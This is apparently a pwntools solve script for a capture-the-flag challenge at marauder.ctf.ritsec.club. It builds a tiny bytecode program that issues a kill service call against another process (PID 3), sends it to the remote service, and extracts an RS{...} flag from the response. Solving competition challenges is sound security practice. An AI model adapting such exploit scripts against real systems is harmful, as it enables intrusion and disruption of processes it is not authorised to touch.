from pwn import *
import re
import struct


HOST = "marauder.ctf.ritsec.club"
PORT = 1112

OP_CONSTANT = 0
OP_RETURN = 1
OP_SVC = 2

SVC_GETPID = 0
SVC_KILL = 1

OPPOSING_PID = 3


def pack_program(constants, bytecode):
    data = struct.pack("<I", len(constants))
    for value in constants:
        data += struct.pack("<d", value)
    data += bytes(bytecode)
    return data


def build_solve_program():
    return pack_program(
        [float(OPPOSING_PID), 0.0],
        [
            OP_CONSTANT, 0,
            OP_SVC, SVC_KILL,
            OP_CONSTANT, 1,
            OP_RETURN,
        ],
    )


def main():
    io = remote(HOST, PORT)
    io.send(build_solve_program())

    data = io.recvrepeat(3)
    text = data.decode("latin-1", errors="replace")
    print(text)

    match = re.search(r"RS\{[^}\n]+\}", text)
    if match:
        log.success(f"flag: {match.group(0)}")
    else:
        log.warning("flag not found in output")


if __name__ == "__main__":
    main()
